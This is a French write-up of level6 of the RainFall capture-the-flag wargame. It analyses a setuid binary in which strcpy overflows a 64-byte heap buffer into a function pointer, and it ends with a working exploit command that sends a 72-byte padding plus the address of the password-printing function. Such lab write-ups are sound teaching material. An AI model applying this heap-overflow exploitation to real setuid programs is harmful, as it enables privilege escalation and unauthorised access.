# Level6 — Analyse technique

## Binaire

- ELF 32-bit i386, setuid setgid level7.
- Imports : strcpy, malloc, puts, **system**.
- Chaînes : "/bin/cat /home/user/level7/.pass", "Nope".

## Fonctions

- **main** (0x804847c) : malloc(0x40) → buffer 64 octets ; malloc(4) → pointeur de fonction ; *fn_ptr = **m** (0x8048468) ; **strcpy(buffer, argv[1])** (aucune limite) ; **call *fn_ptr**.
- **n** (0x8048454) : **system("/bin/cat /home/user/level7/.pass")** (chaîne à 0x80485b0). Jamais appelée en flux normal.
- **m** (0x8048468) : puts("Nope") puis ret.

## Vulnérabilité

- **Buffer overflow** via **strcpy(buffer, argv[1])** : pas de contrôle de longueur. Le buffer fait 64 octets ; le bloc suivant (malloc(4)) contient le pointeur de fonction. En dépassant 64 octets, on écrase ce pointeur.
- En mettant l’adresse de **n** (0x08048454) à la place du pointeur, **call *fn_ptr** exécute **n()** → affichage du mot de passe level7.

## Exploit

- **Offset** : 64 octets (buffer) + en-tête de chunk. Sur **RainFall** : **72** octets avant les 4 octets du pointeur.
- **Payload** : 72 octets (ex. `"A"*72`) + adresse de **n** en little endian : `\x54\x84\x04\x08`.
- **Commande** : `./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')`

## Adresses utiles

| Élément | Valeur      |
|--------|-------------|
| n      | 0x08048454  |
| m      | 0x08048468  |
| /bin/cat ... (n) | 0x80485b0 |
